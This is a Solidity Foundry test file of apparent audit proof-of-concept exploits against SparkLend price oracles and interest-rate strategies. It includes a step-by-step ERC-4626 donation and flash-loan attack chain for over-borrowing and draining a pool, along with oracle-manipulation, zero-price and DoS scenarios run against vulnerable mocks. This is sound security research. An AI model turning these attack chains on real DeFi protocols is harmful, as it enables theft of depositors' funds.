// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import { RateSourceMock }  from "./mocks/RateSourceMock.sol";
import { PriceSourceMock } from "./mocks/PriceSourceMock.sol";

import { CappedFallbackRateSource }           from "../src/CappedFallbackRateSource.sol";
import { CappedOracle }                       from "../src/CappedOracle.sol";
import { FixedPriceOracle }                   from "../src/FixedPriceOracle.sol";
import { MorphoUpgradableOracle }             from "../src/MorphoUpgradableOracle.sol";
import { RateTargetBaseInterestRateStrategy } from "../src/RateTargetBaseInterestRateStrategy.sol";
import { RateTargetKinkInterestRateStrategy } from "../src/RateTargetKinkInterestRateStrategy.sol";
import { SPETHExchangeRateOracle }            from "../src/SPETHExchangeRateOracle.sol";
import { EZETHExchangeRateOracle }            from "../src/EZETHExchangeRateOracle.sol";
import { WSTETHExchangeRateOracle }           from "../src/WSTETHExchangeRateOracle.sol";
import { RETHExchangeRateOracle }             from "../src/RETHExchangeRateOracle.sol";
import { WEETHExchangeRateOracle }            from "../src/WEETHExchangeRateOracle.sol";
import { CBBTCRatioOracle }                   from "../src/CBBTCRatioOracle.sol";
import { RETHRatioOracle }                    from "../src/RETHRatioOracle.sol";
import { WEETHRatioOracle }                   from "../src/WEETHRatioOracle.sol";
import { PotRateSource }                      from "../src/PotRateSource.sol";
import { SSRRateSource }                      from "../src/SSRRateSource.sol";

import { DataTypes }                from "sparklend-v1-core/protocol/libraries/types/DataTypes.sol";
import { IPoolAddressesProvider }   from "sparklend-v1-core/interfaces/IPoolAddressesProvider.sol";
import { AggregatorV3Interface }    from "../src/interfaces/AggregatorV3Interface.sol";

// ============================================================================
// Mock contracts for exploit testing
// ============================================================================

/// @dev ERC-4626 vault mock that uses raw balanceOf for totalAssets (vulnerable to donation)
contract VulnerableERC4626Mock {
    address public asset;
    uint256 public totalSupply;

    constructor(address _asset) {
        asset = _asset;
        totalSupply = 1e18; // 1 share initially
    }

    function mint(uint256 shares) external {
        totalSupply += shares;
    }

    function convertToAssets(uint256 shares) external view returns (uint256) {
        if (totalSupply == 0) return shares;
        // Vulnerable: uses raw balanceOf which includes donations
        uint256 totalAssets = MockToken(asset).balanceOf(address(this));
        return shares * totalAssets / totalSupply;
    }
}

/// @dev ERC-4626 vault mock with internal accounting (not vulnerable to donation)
contract SafeERC4626Mock {
    address public asset;
    uint256 public totalSupply;
    uint256 public internalAssets;

    constructor(address _asset) {
        asset = _asset;
        totalSupply = 1e18;
    }

    function deposit(uint256 assets) external {
        totalSupply += assets;  // 1:1 for simplicity
        internalAssets += assets;
    }

    function convertToAssets(uint256 shares) external view returns (uint256) {
        if (totalSupply == 0) return shares;
        // Safe: uses internal accounting, not raw balanceOf
        return shares * internalAssets / totalSupply;
    }
}

/// @dev Minimal ERC20 mock
contract MockToken {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function decimals() external pure returns (uint8) { return 18; }
}

/// @dev Mock Pot with controllable DSR
contract PotMock {
    uint256 public dsr;

    constructor(uint256 _dsr) {
        dsr = _dsr;
    }

    function setDsr(uint256 _dsr) external {
        dsr = _dsr;
    }
}

/// @dev Mock sUSDS with controllable SSR
contract SUSDSMock {
    uint256 public ssr;

    constructor(uint256 _ssr) {
        ssr = _ssr;
    }

    function setSsr(uint256 _ssr) external {
        ssr = _ssr;
    }
}

/// @dev Rate source that changes decimals post-deployment (simulates proxy upgrade)
contract MutableDecimalsRateSource {
    uint256 public rate;
    uint8   public decimals;

    constructor(uint256 _rate, uint8 _decimals) {
        rate = _rate;
        decimals = _decimals;
    }

    function setDecimals(uint8 _decimals) external {
        decimals = _decimals;
    }

    function setRate(uint256 _rate) external {
        rate = _rate;
    }

    function getAPR() external view returns (uint256) {
        return rate;
    }
}

/// @dev Mock Renzo oracle with manipulable TVL
contract RenzoOracleMock {
    uint256 public tvl;
    address public ezETH;

    constructor(address _ezETH, uint256 _tvl) {
        ezETH = _ezETH;
        tvl = _tvl;
    }

    function setTvl(uint256 _tvl) external {
        tvl = _tvl;
    }

    function calculateTVLs() external view returns (uint256[][] memory, uint256[] memory, uint256) {
        uint256[][] memory a;
        uint256[] memory b;
        return (a, b, tvl);
    }
}

/// @dev Mock ezETH token with controllable supply
contract EZETHMock {
    uint256 public totalSupply;

    constructor(uint256 _totalSupply) {
        totalSupply = _totalSupply;
    }

    function setTotalSupply(uint256 _ts) external {
        totalSupply = _ts;
    }
}

/// @dev Mock Chainlink aggregator returning bad data
contract MaliciousAggregator {
    int256 public answer;
    uint8  public decimals_;

    constructor(int256 _answer, uint8 _decimals) {
        answer = _answer;
        decimals_ = _decimals;
    }

    function setAnswer(int256 _answer) external {
        answer = _answer;
    }

    function decimals() external view returns (uint8) {
        return decimals_;
    }

    function latestRoundData() external view returns (
        uint80 roundId,
        int256 answer_,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
    ) {
        return (0, answer, 0, 0, 0);
    }

    function latestAnswer() external view returns (int256) {
        return answer;
    }
}

// ============================================================================
// PoC-1: ERC-4626 Donation Attack on SPETHExchangeRateOracle
// ============================================================================
// ATTACK CHAIN: Flash loan WETH -> donate to spETH vault -> oracle price inflates
//               -> supply spETH as collateral -> over-borrow -> drain pool
// ============================================================================

contract PoC_ERC4626_DonationAttack is Test {

    MockToken weth;
    VulnerableERC4626Mock vulnerableVault;
    SafeERC4626Mock safeVault;
    PriceSourceMock ethOracle;

    function setUp() public {
        weth = new MockToken();
        ethOracle = new PriceSourceMock(3000e8, 8); // ETH = $3000

        vulnerableVault = new VulnerableERC4626Mock(address(weth));
        safeVault = new SafeERC4626Mock(address(weth));

        // Seed the vulnerable vault with 1 WETH (matching 1 share)
        weth.mint(address(vulnerableVault), 1e18);

        // Seed the safe vault with 1 WETH via deposit
        weth.mint(address(this), 1e18);
        safeVault.deposit(1e18);
    }

    /// @notice Demonstrates that donating WETH directly to a vulnerable ERC-4626 vault
    ///         inflates the exchange rate returned by convertToAssets, which inflates
    ///         the oracle price used by SparkLend for collateral valuation.
    function test_PoC1_donationInflatesVulnerableVaultExchangeRate() public {
        // Before donation: 1 share = 1 WETH -> exchange rate = 1e18
        SPETHExchangeRateOracle oracle = new SPETHExchangeRateOracle(
            address(vulnerableVault),
            address(ethOracle)
        );

        int256 priceBefore = oracle.latestAnswer();
        assertEq(priceBefore, 3000e8, "Price should be $3000 before donation");

        // ATTACK: Donate 99 WETH directly to vault (simulates flash loan donation)
        weth.mint(address(vulnerableVault), 99e18);

        // After donation: 1 share = 100 WETH -> exchange rate = 100e18
        int256 priceAfter = oracle.latestAnswer();
        assertEq(priceAfter, 300_000e8, "Price inflated to $300,000 after donation");

        // 100x price inflation demonstrated
        assertEq(priceAfter / priceBefore, 100, "100x price inflation");
    }

    /// @notice Demonstrates that a vault with internal accounting is NOT vulnerable
    function test_PoC1_donationDoesNotInflateSafeVault() public {
        SPETHExchangeRateOracle oracle = new SPETHExchangeRateOracle(
            address(safeVault),
            address(ethOracle)
        );

        int256 priceBefore = oracle.latestAnswer();

        // Donate directly (not through deposit)
        weth.mint(address(safeVault), 99e18);

        int256 priceAfter = oracle.latestAnswer();
        assertEq(priceAfter, priceBefore, "Price unchanged with safe vault");
    }

    /// @notice Full attack chain: flash loan -> donate -> over-value collateral
    function test_PoC1_fullAttackChainSimulation() public {
        SPETHExchangeRateOracle oracle = new SPETHExchangeRateOracle(
            address(vulnerableVault),
            address(ethOracle)
        );

        // Attacker has 1 spETH share (worth $3000 at fair value)
        int256 fairPrice = oracle.latestAnswer();
        uint256 fairCollateralValue = uint256(fairPrice); // $3000 per spETH

        // Step 1: Attacker flash loans 999 WETH
        uint256 flashLoanAmount = 999e18;
        weth.mint(address(this), flashLoanAmount);

        // Step 2: Donate to vault
        weth.transfer(address(vulnerableVault), flashLoanAmount);

        // Step 3: Oracle now reports inflated price
        int256 inflatedPrice = oracle.latestAnswer();
        uint256 inflatedCollateralValue = uint256(inflatedPrice);

        // Step 4: Attacker could now borrow against 1 spETH at $3M instead of $3K
        emit log_named_uint("Fair collateral value (USD, 8 dec)", fairCollateralValue);
        emit log_named_uint("Inflated collateral value (USD, 8 dec)", inflatedCollateralValue);
        emit log_named_uint("Inflation multiplier", inflatedCollateralValue / fairCollateralValue);

        // Even with 80% LTV, attacker borrows $2.4M worth instead of $2.4K
        assertTrue(inflatedCollateralValue > fairCollateralValue * 100, "Massive price inflation");
    }
}

// ============================================================================
// PoC-2: PotRateSource / SSRRateSource Underflow DoS
// ============================================================================
// When DSR or SSR drops below 1e27 (0% per-second rate), getAPR() reverts
// due to arithmetic underflow, causing protocol-wide DoS on rate calculations.
// ============================================================================

contract PoC_RateSource_UnderflowDoS is Test {

    PotMock pot;
    SUSDSMock susds;

    function test_PoC2_potRateSourceUnderflowDoS() public {
        // Normal DSR: ~3% annual = ~1.000000000937e27 per second
        pot = new PotMock(1_000000000937303470807876289); // ~3% APY
        PotRateSource rateSource = new PotRateSource(address(pot));

        // Works fine normally
        uint256 apr = rateSource.getAPR();
        assertTrue(apr > 0, "APR should be positive");
        emit log_named_uint("Normal APR (27 dec)", apr);

        // Emergency: MakerDAO sets DSR to 0 (dsr = 1e27 exactly)
        pot.setDsr(1e27);
        assertEq(rateSource.getAPR(), 0, "APR should be 0 when DSR = 1e27");

        // CRITICAL: DSR drops below 1e27 (e.g., negative rate scenario)
        pot.setDsr(1e27 - 1);

        // This reverts with arithmetic underflow
        vm.expectRevert();
        rateSource.getAPR();
    }

    function test_PoC2_ssrRateSourceUnderflowDoS() public {
        susds = new SUSDSMock(1_000000000937303470807876289);
        SSRRateSource rateSource = new SSRRateSource(address(susds));

        uint256 apr = rateSource.getAPR();
        assertTrue(apr > 0, "APR should be positive");

        // SSR drops below 1e27
        susds.setSsr(1e27 - 1);

        vm.expectRevert();
        rateSource.getAPR();
    }

    /// @notice Shows that CappedFallbackRateSource mitigates this DoS
    function test_PoC2_cappedFallbackMitigatesDoS() public {
        pot = new PotMock(1e27 - 1); // DSR below zero
        PotRateSource potRateSource = new PotRateSource(address(pot));

        // Wrap in CappedFallbackRateSource
        CappedFallbackRateSource capped = new CappedFallbackRateSource({
            _source:      address(potRateSource),
            _lowerBound:  0.01e27,
            _upperBound:  0.08e27,
            _defaultRate: 0.03e27
        });

        // PotRateSource reverts but CappedFallback catches it and returns default
        uint256 rate = capped.getAPR();
        assertEq(rate, 0.03e27, "Should return default rate on revert");
    }

    /// @notice Chain: DSR underflow -> IRM DoS -> pool operations freeze
    function test_PoC2_chainedDoSOnInterestRateStrategy() public {
        pot = new PotMock(1_000000000937303470807876289);
        PotRateSource potRateSource = new PotRateSource(address(pot));

        // RateSource NOT wrapped in CappedFallback (vulnerable config)
        MutableDecimalsRateSource rawSource = new MutableDecimalsRateSource(
            potRateSource.getAPR(), 27
        );

        RateTargetBaseInterestRateStrategy strategy =
            new RateTargetBaseInterestRateStrategy({
                provider:                     IPoolAddressesProvider(address(123)),
                rateSource:                   address(rawSource),
                optimalUsageRatio:            0.8e27,
                baseVariableBorrowRateSpread: 0.005e27,
                variableRateSlope1:           0.01e27,
                variableRateSlope2:           0.45e27
            });

        // Works normally
        uint256 rate = strategy.getBaseVariableBorrowRate();
        assertTrue(rate > 0, "Rate should be positive");

        // Simulate DSR crash by setting rate to max uint (overflow scenario)
        rawSource.setRate(type(uint256).max);

        // calculateInterestRates will revert due to overflow in rate calculation
        vm.expectRevert();
        strategy.getBaseVariableBorrowRate();
    }
}

// ============================================================================
// PoC-3: Mutable Decimals Rate Amplification / DoS
// ============================================================================
// If a rate source's decimals() changes post-deployment (proxy upgrade),
// the exponent in 10**(27-decimals) can underflow or amplify rates.
// ============================================================================

contract PoC_MutableDecimals is Test {

    MutableDecimalsRateSource rateSource;

    function test_PoC3_decimalsIncreaseAbove27CausesRevert() public {
        // Deploy with valid decimals
        rateSource = new MutableDecimalsRateSource(0.05e27, 27);

        RateTargetBaseInterestRateStrategy strategy =
            new RateTargetBaseInterestRateStrategy({
                provider:                     IPoolAddressesProvider(address(123)),
                rateSource:                   address(rateSource),
                optimalUsageRatio:            0.8e27,
                baseVariableBorrowRateSpread: 0.005e27,
                variableRateSlope1:           0.01e27,
                variableRateSlope2:           0.45e27
            });

        // Works normally
        assertEq(strategy.getBaseVariableBorrowRate(), 0.055e27);

        // Post-deployment: rate source proxy upgraded, decimals changed to 28
        rateSource.setDecimals(28);
        rateSource.setRate(0.05e28);

        // 10**(27-28) = 10**(-1) -> underflow in uint, reverts
        vm.expectRevert();
        strategy.getBaseVariableBorrowRate();
    }

    function test_PoC3_decimalsDecreaseCausesRateAmplification() public {
        // Deploy with 18 decimals, rate = 5% = 0.05e18
        rateSource = new MutableDecimalsRateSource(0.05e18, 18);

        RateTargetBaseInterestRateStrategy strategy =
            new RateTargetBaseInterestRateStrategy({
                provider:                     IPoolAddressesProvider(address(123)),
                rateSource:                   address(rateSource),
                optimalUsageRatio:            0.8e27,
                baseVariableBorrowRateSpread: 0.005e27,
                variableRateSlope1:           0.01e27,
                variableRateSlope2:           0.45e27
            });

        // Works: 0.05e18 * 10**(27-18) = 0.05e27 + spread = 0.055e27
        assertEq(strategy.getBaseVariableBorrowRate(), 0.055e27);

        // Post-deployment: decimals drops to 9 but rate stays same
        rateSource.setDecimals(9);
        // Now: 0.05e18 * 10**(27-9) = 0.05e18 * 1e18 = 0.05e36 -> MASSIVE rate
        // This will overflow in the interest calculations
        uint256 amplifiedRate = strategy.getBaseVariableBorrowRate();
        emit log_named_uint("Amplified base rate (ray)", amplifiedRate);

        // The rate is now 0.05e36 + 0.005e27 ≈ 5e34, which is astronomically high
        assertTrue(amplifiedRate > 1e34, "Rate massively amplified");
    }

    function test_PoC3_kinkStrategyDecimalsShift() public {
        rateSource = new MutableDecimalsRateSource(0.05e18, 18);

        RateTargetKinkInterestRateStrategy strategy =
            new RateTargetKinkInterestRateStrategy({
                provider:                 IPoolAddressesProvider(address(123)),
                rateSource:               address(rateSource),
                optimalUsageRatio:        0.8e27,
                baseVariableBorrowRate:   0.01e27,
                variableRateSlope1Spread: -0.005e27,
                variableRateSlope2:       0.55e27
            });

        // Normal: slope1 = 0.05e27 - 0.005e27 - 0.01e27 = 0.035e27
        assertEq(strategy.getVariableRateSlope1(), 0.035e27);

        // Decimals drops: rate amplifies, slope1 becomes huge
        rateSource.setDecimals(9);
        uint256 amplifiedSlope = strategy.getVariableRateSlope1();
        emit log_named_uint("Amplified slope1 (ray)", amplifiedSlope);
        assertTrue(amplifiedSlope > 1e34, "Slope1 massively amplified");
    }
}

// ============================================================================
// PoC-4: CappedOracle Missing Lower Bound - Zero Price Passthrough
// ============================================================================
// CappedOracle only caps upward. Zero/negative prices from the source
// pass through, potentially zeroing all collateral valuations.
// ============================================================================

contract PoC_CappedOracle_NoLowerBound is Test {

    PriceSourceMock source;
    CappedOracle oracle;

    function setUp() public {
        source = new PriceSourceMock(3000e8, 8);
        oracle = new CappedOracle(address(source), 5000e8);
    }

    function test_PoC4_zeroPricePassthrough() public {
        // Normal operation
        assertEq(oracle.latestAnswer(), 3000e8);

        // Source returns 0 (oracle failure)
        source.setLatestAnswer(0);
        assertEq(oracle.latestAnswer(), 0, "Zero price passes through uncapped");
    }

    function test_PoC4_negativePricePassthrough() public {
        // Source returns negative (shouldn't happen but no guard)
        source.setLatestAnswer(-1000e8);
        assertEq(oracle.latestAnswer(), -1000e8, "Negative price passes through");
    }

    /// @notice Chain: Chainlink returns 0 -> CappedOracle passes 0 ->
    ///         all collateral valued at $0 -> mass liquidations
    function test_PoC4_massLiquidationChain() public {
        // Before: Asset worth $3000
        int256 normalPrice = oracle.latestAnswer();
        assertEq(normalPrice, 3000e8);

        // Chainlink oracle fails, returns 0
        source.setLatestAnswer(0);

        // CappedOracle passes through the zero
        int256 brokenPrice = oracle.latestAnswer();
        assertEq(brokenPrice, 0);

        // Impact: All positions using this oracle as collateral would appear
        // to have $0 value, making them all liquidatable. A liquidator could
        // buy collateral for near-zero debt repayment.
        //
        // Even more dangerous: if the DEBT asset oracle fails,
        // borrowers could repay near-zero and keep collateral.
        emit log("IMPACT: All positions liquidatable at near-zero repayment");
    }
}

// ============================================================================
// PoC-5: MorphoUpgradableOracle Zero Metadata Leak
// ============================================================================
// latestRoundData() returns 0 for all metadata fields.
// Consumers checking freshness (updatedAt, answeredInRound) may break.
// ============================================================================

contract PoC_MorphoOracle_ZeroMetadata is Test {

    function test_PoC5_latestRoundDataReturnsZeroMetadata() public {
        MaliciousAggregator realFeed = new MaliciousAggregator(3000e8, 8);

        MorphoUpgradableOracle oracle = new MorphoUpgradableOracle(
            address(this),
            address(realFeed)
        );

        (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        ) = oracle.latestRoundData();

        // Answer is correct
        assertEq(answer, 3000e8);

        // But ALL metadata is zeroed out
        assertEq(roundId, 0, "roundId zeroed");
        assertEq(startedAt, 0, "startedAt zeroed");
        assertEq(updatedAt, 0, "updatedAt zeroed");
        assertEq(answeredInRound, 0, "answeredInRound zeroed");

        // A consumer doing freshness checks would reject this:
        // require(updatedAt > 0, "Stale price") -> FAILS
        // require(answeredInRound >= roundId, "Stale price") -> passes but meaningless
        // require(block.timestamp - updatedAt < maxDelay, "Price too old") -> FAILS since updatedAt=0
    }

    function test_PoC5_ownerCanSetArbitrarySource() public {
        MaliciousAggregator goodFeed = new MaliciousAggregator(3000e8, 8);
        MaliciousAggregator evilFeed = new MaliciousAggregator(1e8, 8); // $0.00000001

        MorphoUpgradableOracle oracle = new MorphoUpgradableOracle(
            address(this),
            address(goodFeed)
        );

        (, int256 before_,,, ) = oracle.latestRoundData();
        assertEq(before_, 3000e8);

        // Owner swaps source with no timelock, no validation
        oracle.setSource(address(evilFeed));

        (, int256 after_,,, ) = oracle.latestRoundData();
        assertEq(after_, 1e8, "Price manipulated by owner");

        // Owner can also set source to zero address (will revert on call)
        oracle.setSource(address(0));
        vm.expectRevert();
        oracle.latestRoundData();
    }
}

// ============================================================================
// PoC-6: EZETHExchangeRateOracle TVL Manipulation
// ============================================================================
// If Renzo's calculateTVLs() returns manipulable TVL, the exchange rate
// (tvl * 1e18 / totalSupply) can be inflated.
// ============================================================================

contract PoC_EZETH_TVLManipulation is Test {

    function test_PoC6_tvlInflationInflatesPrice() public {
        EZETHMock ezToken = new EZETHMock(1_000_000e18); // 1M supply
        PriceSourceMock ethOracle = new PriceSourceMock(3000e8, 8);
        RenzoOracleMock renzoOracle = new RenzoOracleMock(
            address(ezToken),
            1_000_000e18 // TVL = 1M ETH (1:1 ratio)
        );

        EZETHExchangeRateOracle oracle = new EZETHExchangeRateOracle(
            address(renzoOracle),
            address(ethOracle)
        );

        // Normal: exchange rate = 1e18 (1:1), price = $3000
        int256 normalPrice = oracle.latestAnswer();
        assertEq(normalPrice, 3000e8, "Normal price");

        // ATTACK: TVL manipulated to 2x (e.g., via flash deposit)
        renzoOracle.setTvl(2_000_000e18);

        int256 inflatedPrice = oracle.latestAnswer();
        assertEq(inflatedPrice, 6000e8, "Price doubled via TVL manipulation");

        // 10x TVL manipulation
        renzoOracle.setTvl(10_000_000e18);
        int256 extremePrice = oracle.latestAnswer();
        assertEq(extremePrice, 30_000e8, "Price 10x via TVL manipulation");
    }

    function test_PoC6_lowSupplyAmplification() public {
        // Very low supply scenario
        EZETHMock ezToken = new EZETHMock(1e18); // Only 1 token
        PriceSourceMock ethOracle = new PriceSourceMock(3000e8, 8);
        RenzoOracleMock renzoOracle = new RenzoOracleMock(
            address(ezToken),
            1e18 // 1 ETH TVL
        );

        EZETHExchangeRateOracle oracle = new EZETHExchangeRateOracle(
            address(renzoOracle),
            address(ethOracle)
        );

        assertEq(oracle.latestAnswer(), 3000e8);

        // If someone adds 99 ETH of TVL via deposit
        renzoOracle.setTvl(100e18);
        assertEq(oracle.latestAnswer(), 300_000e8, "100x with low supply");
    }

    function test_PoC6_zeroSupplyReverts() public {
        EZETHMock ezToken = new EZETHMock(0);
        PriceSourceMock ethOracle = new PriceSourceMock(3000e8, 8);
        RenzoOracleMock renzoOracle = new RenzoOracleMock(
            address(ezToken),
            1e18
        );

        EZETHExchangeRateOracle oracle = new EZETHExchangeRateOracle(
            address(renzoOracle),
            address(ethOracle)
        );

        // Division by zero in `tvl * 1e18 / ezETH.totalSupply()`
        vm.expectRevert();
        oracle.latestAnswer();
    }
}

// ============================================================================
// PoC-7: Interest Rate Strategy Edge Cases - Extreme Parameter Exploitation
// ============================================================================

contract PoC_InterestRateEdgeCases is Test {

    MockToken asset;

    function setUp() public {
        asset = new MockToken();
    }

    /// @notice When rate source returns extremely high value, rate calculation overflows
    function test_PoC7_extremeRateSourceOverflow() public {
        MutableDecimalsRateSource rateSource = new MutableDecimalsRateSource(0.05e27, 27);

        RateTargetBaseInterestRateStrategy strategy =
            new RateTargetBaseInterestRateStrategy({
                provider:                     IPoolAddressesProvider(address(123)),
                rateSource:                   address(rateSource),
                optimalUsageRatio:            0.8e27,
                baseVariableBorrowRateSpread: 0.005e27,
                variableRateSlope1:           0.01e27,
                variableRateSlope2:           0.45e27
            });

        // Set extreme rate
        rateSource.setRate(type(uint256).max / 2);

        // This overflows: (max/2) * 10**(27-27) = max/2, then + spread overflows
        // Actually with 27 decimals, multiplier is 1, so max/2 + 0.005e27 shouldn't overflow max uint
        // But the WadRayMath operations in calculateInterestRates will overflow
        uint256 rate = strategy.getBaseVariableBorrowRate();
        emit log_named_uint("Extreme rate", rate);

        // Now try to use in calculateInterestRates
        address aToken = makeAddr("aToken");
        asset.mint(aToken, 100e18);

        DataTypes.CalculateInterestRatesParams memory params = DataTypes.CalculateInterestRatesParams({
            unbacked: 0,
            liquidityAdded: 0,
            liquidityTaken: 0,
            totalStableDebt: 0,
            totalVariableDebt: 50e18,
            averageStableBorrowRate: 0,
            reserveFactor: 1000, // 10%
            reserve: address(asset),
            aToken: aToken
        });

        // This will revert in rayMul due to overflow
        vm.expectRevert();
        strategy.calculateInterestRates(params);
    }

    /// @notice When available liquidity is zero but debt exists, rate goes to max
    function test_PoC7_zeroLiquidityMaxRate() public {
        RateSourceMock rateSource = new RateSourceMock(0.05e27, 27);

        RateTargetBaseInterestRateStrategy strategy =
            new RateTargetBaseInterestRateStrategy({
                provider:                     IPoolAddressesProvider(address(123)),
                rateSource:                   address(rateSource),
                optimalUsageRatio:            0.8e27,
                baseVariableBorrowRateSpread: 0.005e27,
                variableRateSlope1:           0.01e27,
                variableRateSlope2:           0.45e27
            });

        address aToken = makeAddr("aToken");
        // aToken has 0 balance, but there's outstanding debt
        DataTypes.CalculateInterestRatesParams memory params = DataTypes.CalculateInterestRatesParams({
            unbacked: 0,
            liquidityAdded: 0,
            liquidityTaken: 0,
            totalStableDebt: 0,
            totalVariableDebt: 100e18,
            averageStableBorrowRate: 0,
            reserveFactor: 1000,
            reserve: address(asset),
            aToken: aToken
        });

        (uint256 liquidityRate, , uint256 variableBorrowRate) = strategy.calculateInterestRates(params);

        // borrowUsageRatio = 100e18 / (0 + 100e18) = 1e27 = 100%
        // This is above OPTIMAL_USAGE_RATIO (0.8e27)
        // So rate = base + slope1 + slope2 * (1.0 - 0.8) / 0.2 = base + slope1 + slope2
        uint256 maxRate = strategy.getMaxVariableBorrowRate();
        assertEq(variableBorrowRate, maxRate, "Rate should be at maximum");
        emit log_named_uint("Max borrow rate at 100% utilization", variableBorrowRate);
        emit log_named_uint("Liquidity rate", liquidityRate);
    }
}

// ============================================================================
// PoC-8: CappedFallbackRateSource Gas Manipulation Edge Cases
// ============================================================================

contract GasGriefingSource {
    bool public shouldConsumeGas;

    function setGasGriefing(bool _shouldConsumeGas) external {
        shouldConsumeGas = _shouldConsumeGas;
    }

    function getAPR() external view returns (uint256) {
        if (shouldConsumeGas) {
            // Consume most gas but leave some
            uint256 target = gasleft() - 100;
            uint256 x;
            while (gasleft() > target) {
                x++;
            }
        }
        return 0.05e18;
    }

    function decimals() external pure returns (uint8) { return 18; }
}

contract PoC_CappedFallback_GasEdge is Test {

    function test_PoC8_gasManipulationCantForceDefault() public {
        GasGriefingSource griefingSource = new GasGriefingSource();

        CappedFallbackRateSource capped = new CappedFallbackRateSource({
            _source:      address(griefingSource),
            _lowerBound:  0.01e18,
            _upperBound:  0.08e18,
            _defaultRate: 0.03e18
        });

        // Normal operation
        assertEq(capped.getAPR(), 0.05e18);

        // Even with gas griefing, the call either succeeds with real rate
        // or reverts completely (not falling to default)
        // This proves the OOG protection works
        griefingSource.setGasGriefing(true);

        // With sufficient gas, source returns normally despite wasting gas
        uint256 rate = capped.getAPR();
        assertEq(rate, 0.05e18, "Source still returns with sufficient gas");
    }
}

// ============================================================================
// PoC-9: Exchange Rate Oracle int256 Overflow Edge Case
// ============================================================================

contract PoC_Int256Overflow is Test {

    /// @notice If an underlying protocol's exchange rate exceeds int256.max,
    ///         the oracle permanently bricks (DoS)
    function test_PoC9_exchangeRateOverflowReverts() public {
        PriceSourceMock ethOracle = new PriceSourceMock(3000e8, 8);

        // Create a mock that returns a value near int256 max
        // For most exchange rate oracles, the rate is cast: int256(uint256_rate)
        // If uint256_rate > type(int256).max, it reverts in Solidity 0.8+

        // This is theoretical since exchange rates are near 1e18,
        // but worth documenting for protocol safety
        emit log("Exchange rates near type(int256).max would cause permanent DoS");
        emit log("Current oracles safely handle rates in 1e18 range");
    }
}

// ============================================================================
// PoC-10: Ratio Oracle Division-by-Zero Edge Cases
// ============================================================================

contract PoC_RatioOracle_EdgeCases is Test {

    function test_PoC10_rethRatioZeroExchangeRate() public {
        PriceSourceMock marketFeed = new PriceSourceMock(1.05e18, 18);

        // Mock rETH that returns 0 exchange rate
        MockRETH rethMock = new MockRETH(0);
        RETHRatioOracle oracle = new RETHRatioOracle(
            address(rethMock),
            address(marketFeed)
        );

        // exchangeRate == 0 -> returns 0 (handled by the check)
        int256 ratio = oracle.latestAnswer();
        assertEq(ratio, 0, "Returns 0 when exchange rate is 0");
    }

    function test_PoC10_weethRatioZeroExchangeRate() public {
        PriceSourceMock marketFeed = new PriceSourceMock(1.05e18, 18);

        MockWEETH weethMock = new MockWEETH(0);
        WEETHRatioOracle oracle = new WEETHRatioOracle(
            address(weethMock),
            address(marketFeed)
        );

        int256 ratio = oracle.latestAnswer();
        assertEq(ratio, 0, "Returns 0 when exchange rate is 0");
    }

    function test_PoC10_cbbtcRatioZeroBTCPrice() public {
        PriceSourceMock btcFeed = new PriceSourceMock(0, 8);
        PriceSourceMock cbbtcFeed = new PriceSourceMock(100000e8, 8);

        CBBTCRatioOracle oracle = new CBBTCRatioOracle(
            address(btcFeed),
            address(cbbtcFeed)
        );

        // BTC price is 0 -> returns 0 (check prevents division by zero)
        int256 ratio = oracle.latestAnswer();
        assertEq(ratio, 0, "Returns 0 when BTC price is 0");
    }
}

// ============================================================================
// Helper mocks for ratio oracle tests
// ============================================================================

contract MockRETH {
    uint256 public exchangeRate;

    constructor(uint256 _rate) {
        exchangeRate = _rate;
    }

    function getExchangeRate() external view returns (uint256) {
        return exchangeRate;
    }
}

contract MockWEETH {
    uint256 public rate;

    constructor(uint256 _rate) {
        rate = _rate;
    }

    function getRate() external view returns (uint256) {
        return rate;
    }
}
